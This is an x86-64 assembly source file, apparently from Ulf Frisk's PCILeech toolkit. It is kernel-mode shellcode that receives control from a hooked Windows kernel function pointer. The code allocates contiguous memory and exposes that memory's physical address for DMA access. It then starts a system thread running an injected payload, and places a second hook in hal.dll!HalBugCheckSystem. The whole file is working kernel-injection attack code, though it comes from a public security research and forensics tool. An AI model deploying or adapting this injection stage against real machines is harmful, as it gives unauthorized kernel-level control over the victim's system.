; wx64_stage23_vmm.asm : assembly to receive execution from initial hook
; based on the memory process file system assisted injection technique.
;
; (c) Ulf Frisk, 2019
; Author: Ulf Frisk, pcileech@frizk.net
;

EXTRN stage3_c_EntryPoint:NEAR

.CODE

main PROC
	; ----------------------------------------------------
	; 0: INITIAL OP AND VARIABLE MEMORY LOCATIONS
	;    - 1st JMP to main_start is the landing location for the 1st hook
	;    (hook of the function pointer) to gain initial execution.
	;    - 2nd JMP to stage3_c_EntryPoint is the landing for the 2nd hook
	;    (currently placed in hal.dll!HalBugCheckSystem) which receives
	;    execution flow in a safe non-BSOD way after PsCreateSystemThread
	;    - Other values below are filled in at runtime after analyzing and
	;    observing the target system with the memory process file system.
	; ----------------------------------------------------
	JMP main_start
	JMP stage3_c_EntryPoint											; offset 0x02
	data_filler							db 0
	addr_cmpxchg_flag					dq 1111111111111111h		; offset 0x08
	addr_orig_code						dq 2222222222222222h		; offset 0x10
	addr_dbg							dq 3333333333333333h		; offset 0x18
	addr_kmddata						dq 4444444444444444h		; offset 0x20
	addr_NTOSKRNL						dq 5555555555555555h		; offset 0x28
	addr_MmAllocateContiguousMemory		dq 6666666666666666h		; offset 0x30
	addr_PsCreateSystemThread			dq 7777777777777777h		; offset 0x38
	addr_MmGetPhysicalAddress			dq 8888888888888888h		; offset 0x40
	addr_KeGetCurrentIrql				dq 9999999999999999h		; offset 0x48
	addr_JMP_DST						dq 1111111111111111h		; offset 0x50
	; ----------------------------------------------------
	; 1: SAVE ORIGINAL PARAMETERS
	; ----------------------------------------------------
	main_start:
	PUSH rax
	PUSH rcx
	PUSH rdx
	PUSH r8
	PUSH r9
	PUSH r12
	PUSH r13
	; ----------------------------------------------------
	; 2: ENSURE IRQL PASSIVE
	; ----------------------------------------------------
	CALL [addr_KeGetCurrentIrql]
	TEST rax, rax
	JNZ skipcall
	; ----------------------------------------------------
	; 3: ENSURE ATOMICITY IN THREADED ENVIRONMENTS
	; ----------------------------------------------------
	MOV al, 00h
	MOV dl, 01h
	MOV rcx, [addr_cmpxchg_flag]
	LOCK CMPXCHG [rcx], dl
	JNE skipcall
	; ----------------------------------------------------
	; 4: CALL MAIN SETUP CODE
	; ----------------------------------------------------
	CALL SetupEntryPoint
	; ----------------------------------------------------
	; 5: RESTORE AND JMP BACK
	; ----------------------------------------------------
	skipcall:
	POP r13
	POP r12
	POP r9
	POP r8
	POP rdx
	POP rcx
	POP rax
	JMP [addr_orig_code]
main ENDP

SetupEntryPoint PROC
	PUSH rax					; STACK ALIGN
	; r12 = address of debug memory location
	; r13 = memory address of KMDDATA
	MOV r12, [addr_dbg]
	; ----------------------------------------------------
	; ALLOCATE 0x1000 CONTIGUOUS MEMORY BELOW 0x7fffffff FOR KMDDATA
	; ----------------------------------------------------
	SUB rsp, 20h
	MOV rcx, 1000h
	MOV rdx, 7fffffffh	
	CALL [addr_MmAllocateContiguousMemory]
	ADD rsp, 20h
	MOV r13, rax
	MOV byte ptr [r12], 2		; DEBUG
	MOV [r12+16], rax			; DEBUG
	; ----------------------------------------------------
	; GET PHYSICAL ADDRESS OF KMDDATA AND SET IT EXTERNALLY
	; ----------------------------------------------------
	SUB rsp, 20h
	MOV rcx, r13
	CALL [addr_MmGetPhysicalAddress]
	ADD rsp, 20h
	MOV rcx, [addr_kmddata]
	MOV [rcx], rax
	MOV byte ptr [r12], 3		; DEBUG
	; ----------------------------------------------------
	; ZERO ALLOCATED MEMORY
	; ----------------------------------------------------
	XOR rax, rax
	MOV ecx, 200h
	clear_loop:
	DEC ecx
	MOV [r13+rcx*8], rax
	JNZ clear_loop
	MOV byte ptr [r12], 4		; DEBUG
	; ----------------------------------------------------
	; SET NTOSBASE IN KMDDATA
	; ----------------------------------------------------
	MOV rax, [addr_NTOSKRNL]
	MOV [r13+8], rax
	MOV byte ptr [r12], 5		; DEBUG
	; ----------------------------------------------------
	; CREATE THREAD
	; ----------------------------------------------------
	PUSH rax					; STACK ALIGN
	PUSH r13					; StartContext
	MOV rax, [addr_JMP_DST]
	PUSH rax					; StartRoutine
	PUSH 0						; ClientId
	SUB rsp, 020h
	XOR r9, r9					; ProcessHandle
	XOR r8, r8					; ObjectAttributes
	MOV rdx, 1fffffh			; DesiredAccess
	MOV rcx, r13				; ThreadHandle
	CALL [addr_PsCreateSystemThread]
	ADD rsp, 040h
	MOV byte ptr [r12], 6		; DEBUG
	; ----------------------------------------------------
	; RETURN
	; ----------------------------------------------------
	POP rax						; STACK ALIGN
	RET
SetupEntryPoint ENDP

END
